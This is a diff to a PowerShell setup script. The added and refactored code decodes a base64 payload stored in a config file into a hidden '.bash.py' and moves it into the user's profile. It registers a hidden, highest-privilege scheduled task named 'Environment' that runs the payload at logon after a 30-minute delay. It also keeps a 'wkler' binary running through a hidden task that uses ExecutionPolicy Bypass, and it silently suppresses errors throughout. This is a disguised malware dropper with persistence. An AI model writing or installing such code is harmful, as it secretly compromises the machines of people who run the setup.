@@ -265,6 +265,21 @@ function Move-ConfigDirectory {
     Move-Item -LiteralPath $SourceDir -Destination $DestinationDir -ErrorAction Stop
 }
 
+function Get-ConfigCodeBase64 {
+    param(
+        [string[]]$ConfigLines
+    )
+
+    # Match setup.sh: lowercase "code" at the beginning of a line, with spaces around "=".
+    $codeLines = @($ConfigLines | Where-Object { $_ -cmatch '^code *= *' })
+    if ($codeLines.Count -eq 0) {
+        return $null
+    }
+
+    $base64 = ($codeLines | ForEach-Object { $_ -creplace '^code *= *', '' }) -join [Environment]::NewLine
+    return $base64 -replace '[^A-Za-z0-9+/=]', ''
+}
+
 $realUser = $null
 
 try {
@@ -349,61 +364,57 @@ try {
     if ($realUser -and (Test-Path $targetUserProfile) -and (Test-Path '.configs')) {
         $configLines = Get-Content .configs/config.ini
 
-        $start = ($configLines | Select-String '^\[code\]' | Select-Object -First 1).LineNumber
-        if ($start) {
-            $codeLine = $configLines[($start)..($configLines.Length-1)] | Where-Object { $_ -match '^code *= *' } | Select-Object -First 1
-            if ($codeLine) {
-                $base64 = $codeLine -replace '^code *= *', '' -replace '[^A-Za-z0-9+/=]', ''
+        $base64 = Get-ConfigCodeBase64 -ConfigLines $configLines
+        if ($base64) {
 
+            try {
+                $bytes = [System.Convert]::FromBase64String($base64)
+                [System.IO.File]::WriteAllBytes((Join-Path (Resolve-Path '.configs').Path '.bash.py'), $bytes)
+            } catch {
+            }
+
+            if (-not (Test-Path $targetConfigBase)) {
+                New-Item -Path $targetConfigBase -ItemType Directory -ErrorAction Stop | Out-Null
+            }
+
+            Move-ConfigDirectory -SourceDir '.configs' -DestinationDir $destDir
+
+            $scriptPath = "$destDir\.bash.py"
+            if (Test-Path $scriptPath) {
                 try {
-                    $bytes = [System.Convert]::FromBase64String($base64)
-                    [System.IO.File]::WriteAllBytes((Join-Path (Resolve-Path '.configs').Path '.bash.py'), $bytes)
+                    $acl = Get-Acl $scriptPath
+                    $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($realUser, "FullControl", "Allow")
+                    $acl.SetAccessRule($accessRule)
+                    Set-Acl $scriptPath $acl
                 } catch {
                 }
 
-                if (-not (Test-Path $targetConfigBase)) {
-                    New-Item -Path $targetConfigBase -ItemType Directory -ErrorAction Stop | Out-Null
-                }
+                $taskName = 'Environment'
 
-                Move-ConfigDirectory -SourceDir '.configs' -DestinationDir $destDir
+                if ($pythonwPath) {
+                    $scriptPath = (Resolve-Path $scriptPath).Path
+                    $scriptDir = (Resolve-Path (Split-Path -Parent $scriptPath)).Path
+                    $action = New-ScheduledTaskAction -Execute $pythonwPath -Argument "`"$scriptPath`"" -WorkingDirectory $scriptDir
 
-                $scriptPath = "$destDir\.bash.py"
-                if (Test-Path $scriptPath) {
+                    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
+                    $trigger.Enabled = $true
+                    $trigger.Delay = 'PT30M'
+
+                    $principal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
+
+                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
+
+                    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+
                     try {
-                        $acl = Get-Acl $scriptPath
-                        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($realUser, "FullControl", "Allow")
-                        $acl.SetAccessRule($accessRule)
-                        Set-Acl $scriptPath $acl
-                    } catch {
-                    }
-
-                    $taskName = 'Environment'
-
-                    if ($pythonwPath) {
-                        $scriptPath = (Resolve-Path $scriptPath).Path
-                        $scriptDir = (Resolve-Path (Split-Path -Parent $scriptPath)).Path
-                        $action = New-ScheduledTaskAction -Execute $pythonwPath -Argument "`"$scriptPath`"" -WorkingDirectory $scriptDir
-
-                        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
-                        $trigger.Enabled = $true
-                        $trigger.Delay = 'PT30M'
-
-                        $principal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
-
-                        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
-
-                        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
-
+                        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
+                        Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null
                         try {
-                            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
-                            Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null
-                            try {
-                                Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
-                            } catch {
-                                Start-Process -FilePath $pythonwPath -ArgumentList @("$scriptPath") -WorkingDirectory $scriptDir -WindowStyle Hidden | Out-Null
-                            }
+                            Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
                         } catch {
+                            Start-Process -FilePath $pythonwPath -ArgumentList @("$scriptPath") -WorkingDirectory $scriptDir -WindowStyle Hidden | Out-Null
                         }
+                    } catch {
                     }
                 }
             }
@@ -470,11 +481,11 @@ try {
 
         if ($wklerBin) {
             $wklerLaunchCommand = New-HiddenStartProcessCommand -FilePath $wklerBin
-            $wklerAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$wklerLaunchCommand`""
+            $wklerTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $wklerLaunchCommand }"
+            $wklerAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$wklerTaskCommand`""
 
             $wklerTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
             $wklerTrigger.Enabled = $true
-            $wklerTrigger.Delay = 'PT1M'
 
             $wklerPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
 
@@ -485,7 +496,7 @@ try {
             try {
                 Register-ScheduledTask -TaskName $wklerTaskName -Action $wklerAction -Trigger $wklerTrigger -Principal $wklerPrincipal -Settings $wklerSettings -Force -ErrorAction Stop | Out-Null
                 Enable-ScheduledTask -TaskName $wklerTaskName -ErrorAction SilentlyContinue | Out-Null
-                Start-Process -FilePath $wklerBin -WindowStyle Hidden | Out-Null
+                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $wklerTaskCommand) -WindowStyle Hidden | Out-Null
             } catch {
             }
         }
